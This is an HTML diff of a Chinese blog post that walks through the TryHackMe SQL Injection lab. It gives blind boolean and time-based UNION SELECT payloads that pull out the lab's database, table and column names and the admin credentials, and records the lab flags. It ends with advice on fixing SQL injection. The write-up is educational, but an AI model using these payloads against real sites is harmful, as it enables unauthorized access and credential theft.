+                     data-src="/../articleimg/image-20221129191814044.png"
+                      alt="image-20221129191814044"
+                ></p>
+<p>查询数据库的名称（通过使用’%’通配符进行猜解）：</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3 where database() like ‘sqli_three’;–</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129191729735.png"
+                      alt="image-20221129191729735"
+                ></p>
+<p>查找表名（通过使用’%’通配符进行猜解）：</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema &#x3D; ‘sqli_three’ and table_name&#x3D;’users’;–</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129192007733.png"
+                      alt="image-20221129192007733"
+                ></p>
+<p>查找表中的列名（通过使用’%’通配符进行猜解）：</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA&#x3D;’sqli_three’ and TABLE_NAME&#x3D;’users’ and COLUMN_NAME like ‘id’;–</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129192732656.png"
+                      alt="image-20221129192732656"
+                ></p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA&#x3D;’sqli_three’ and TABLE_NAME&#x3D;’users’ and COLUMN_NAME like ‘username’ and COLUMN_NAME !&#x3D;’id’;–</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129193517468.png"
+                      alt="image-20221129193517468"
+                ></p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA&#x3D;’sqli_three’ and TABLE_NAME&#x3D;’users’ and COLUMN_NAME like ‘password’ and COLUMN_NAME !&#x3D;’id’ and COLUMN_NAME !&#x3D;’username’;–</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129193626151.png"
+                      alt="image-20221129193626151"
+                ></p>
+<p>查找表中的一个有效用户名（通过使用’%’通配符进行猜解）：</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3 from users where username like ‘admin’;–</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129193756774.png"
+                      alt="image-20221129193756774"
+                ></p>
+<p>查找表中的有效用户名所对应的密码（通过使用’%’通配符进行猜解）：</p>
+<blockquote>
+<p>admin123’ UNION SELECT 1,2,3 from users where username&#x3D;’admin’ and password like ‘3845’;–</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129193845300.png"
+                      alt="image-20221129193845300"
+                ></p>
+<p>在登录表单中输入获取的用户名和密码值，进行登录操作：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129194026441.png"
+                      alt="image-20221129194026441"
+                ></p>
+<p>进入关卡四，获取关卡三的flag：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129194136336.png"
+                      alt="image-20221129194136336"
+                ></p>
+<blockquote>
+<p>THM{SQL_INJECTION_1093}</p>
+</blockquote>
+<h2 id="SQL盲注—基于时间"><a href="#SQL盲注—基于时间" class="headerlink" title="SQL盲注—基于时间"></a>SQL盲注—基于时间</h2><p><strong>基于时间的SQL盲注</strong></p>
+<p>基于时间的 SQL 注入与上述基于布尔值的SQL注入非常相似，也会发送相同的请求，但是在此处并没有视觉指示器来表明你的查询是对还是错，在时间盲注中，一个正确的SQL查询的指标完全基于该查询完成所需要的时间长短。</p>
+<p>时间延迟的查询效果是通过使用内置方法（例如 <code>SLEEP(x)</code>）以及 <code>UNION</code> 语句来实现的，<code>SLEEP()</code>方法只会在 <code>UNION SELECT</code> 语句查询成功时执行。</p>
+<p>因此，当我们想确定原始查询所用表的具体列数时，可以使用以下查询：</p>
+<blockquote>
+<p>admin123’ UNION SELECT SLEEP(5);–</p>
+</blockquote>
+<p>如果以上查询的响应时间很短，我们就能知道查询是不成功的，所以我们需要添加列数并继续尝试：</p>
+<blockquote>
+<p>admin123’ UNION SELECT SLEEP(5),2;–</p>
+</blockquote>
+<p>以上payload在得到响应时，产生了 5 秒左右的时间延迟，这就说明了<code>UNION SELECT </code>语句已经成功执行并且 我们可以得知原始查询所用的表一共有两列。</p>
+<p>你现在可以参考之前在布尔盲注中所使用的payload 来完成重复枚举过程，将 <code>SLEEP()</code> 方法添加到 <code>UNION SELECT</code> 语句中即可。</p>
+<p>如果你想查找数据库名称，请参考下面的查询以提供你一些帮助：</p>
+<blockquote>
+<p>referrer&#x3D;admin123’ UNION SELECT SLEEP(5),2 where database() like ‘u%’;–</p>
+</blockquote>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129000737897.png"
+                      alt="image-20221129000737897"
+                ></p>
+<p>查看关卡四的原始查询语句，选择url一栏按下回车键即可：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129194840259.png"
+                      alt="image-20221129194840259"
+                ></p>
+<p>在url中使用以下payload来猜解表的列数：</p>
+<blockquote>
+<p>admin123’ UNION SELECT SLEEP(5);–</p>
+<p>admin123’ UNION SELECT SLEEP(5),2;–</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129194607119.png"
+                      alt="image-20221129194607119"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129194712887.png"
+                      alt="image-20221129194712887"
+                ></p>
+<p>参考之前在布尔盲注中所使用的payload来完成对目标数据库的重复枚举过程（通过使用’%’通配符进行猜解），以下只给出查找数据库名称时所用的payload以及最终查询时所用的payload：</p>
+<blockquote>
+<p>admin123’ UNION SELECT SLEEP(5),2 where database() like ‘sqli_four’;–</p>
+<p>admin123’ UNION SELECT SLEEP(5),2 from users where username like ‘admin’ and password like ‘4961’;–</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129200654669.png"
+                      alt="image-20221129200654669"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129201303131.png"
+                      alt="image-20221129201303131"
+                ></p>
+<p>输入刚才查询得到的正确用户名和密码，获取关卡四的flag：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129201747707.png"
+                      alt="image-20221129201747707"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221129201807161.png"
+                      alt="image-20221129201807161"
+                ></p>
+<blockquote>
+<p>THM{SQL_INJECTION_MASTER}</p>
+</blockquote>
+<h2 id="带外SQLi（SQL-injection）"><a href="#带外SQLi（SQL-injection）" class="headerlink" title="带外SQLi（SQL injection）"></a>带外SQLi（SQL injection）</h2><p>带外(Out-of-Band) SQL 注入并不常见，因为它取决于数据库服务器上启用的特定功能或 Web 应用程序的业务逻辑，带外SQL注入攻击能根据 SQL 查询的结果进行某种外部网络调用。</p>
+<p>带外SQL注入攻击可分为两种不同的通信渠道，其中一种将用于发起注入攻击，另一种则用于收集攻击结果。 例如，攻击渠道可能是通过 Web 请求，而数据收集渠道可能是通过监控 针对你所控制的服务器而发出的 HTTP&#x2F;DNS 请求。</p>
+<ol>
+<li>攻击者使用SQL注入payload向存在SQLi漏洞的目标网站发出 Web 请求。</li>
+<li>目标网站对数据库进行 SQL 查询操作，相关的查询语句会加载攻击者所使用的payload。</li>
+<li>攻击者所使用的payload中另外还包含了一个请求，该请求会强制将 包含来自目标服务器数据库的数据的HTTP请求 返回到攻击机上。</li>
+</ol>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128232411773.png"
+                      alt="image-20221128232411773"
+                ></p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128232432501.png"
+                      alt="image-20221128232432501"
+                ></p>
+<h2 id="SQL注入漏洞修复"><a href="#SQL注入漏洞修复" class="headerlink" title="SQL注入漏洞修复"></a>SQL注入漏洞修复</h2><p><strong>漏洞修复</strong></p>
+<p>由于SQL 注入漏洞的影响力，开发人员可以通过遵循下面的一些建议来保护他们的 Web 应用程序免受侵害。</p>
+<p><strong>预编译语句（使用参数化查询）：</strong></p>
+<p>在预编译查询中，开发人员首先编写的是 SQL 查询语句，然后再将任何用户输入都添加为查询语句中的参数。 编写预编译语句可以确保 SQL 代码结构不发生变化，并且数据库也可以更好地区分查询和数据，使用预编译语句还将让你的代码看起来更简洁且更易于阅读。</p>
+<p><strong>对外部输入进行验证：</strong></p>
+<p>输入验证处理可以大大保护输入到 SQL 查询语句中的内容。 通过建立允许列表(白名单)可以将输入限制为仅允许某些字符串，或者通过使用编程语言中的字符串替换方法来过滤一些你允许的字符或不允许的字符。</p>
+<p><strong>转义用户输入：</strong></p>
+<p>允许用户输入包含诸如 <code>&#39; &quot; $ \</code> 之类的特殊字符可能会导致 SQL 查询中断，或者更糟糕的是 攻击者可通过输入这些字符以进行SQL注入攻击；转义用户输入的方法是在这些特殊字符前面加上反斜杠 (<code>\</code>) 字符，然后就能将这些字符作为常规字符串处理而不是作为特殊字符进行解析。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221128221637823.png"
+                      alt="image-20221128221637823"
+                ></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> THM-SQL Injection(SQL注入漏洞)-学习</li>
+        <li><strong>Author:</strong> Hekeatsll</li>
+        <li><strong>Created at
+                :</strong> 2024-01-27 12:19:55</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-01-27 12:24:22
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://hekeatsll.github.io/2024/01/27/THM-SQL Injection(SQL注入漏洞)-学习/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/TryHackMe/">#TryHackMe</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/">#Web安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/01/27/THM-Burp%20Suite%EF%BC%9AThe%20Basics(Burp%20Suite%E5%9F%BA%E7%A1%80%C2%B7%E6%9B%B4%E6%96%B0%E7%89%88)-%E5%AD%A6%E4%B9%A0/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">THM-Burp Suite：The Basics(Burp Suite基础·更新版)-学习</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/01/27/THM-Command%20Injection(%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E)-%E5%AD%A6%E4%B9%A0/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">THM-Command Injection(命令注入漏洞)-学习</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">THM-SQL Injection(SQL注入漏洞)-学习</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9F"><span class="nav-text">什么是数据库？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSQL%EF%BC%9F"><span class="nav-text">什么是SQL？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="nav-text">什么是SQL注入漏洞？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%A6%E5%86%85SQLi%EF%BC%88SQL-injection%EF%BC%89"><span class="nav-text">带内SQLi（SQL injection）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E7%9B%B2%E6%B3%A8%E2%80%94%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87"><span class="nav-text">SQL盲注—身份认证绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E7%9B%B2%E6%B3%A8%E2%80%94%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94"><span class="nav-text">SQL盲注—基于布尔</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E7%9B%B2%E6%B3%A8%E2%80%94%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4"><span class="nav-text">SQL盲注—基于时间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%A6%E5%A4%96SQLi%EF%BC%88SQL-injection%EF%BC%89"><span class="nav-text">带外SQLi（SQL injection）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-text">SQL注入漏洞修复</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Hekeatsll</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
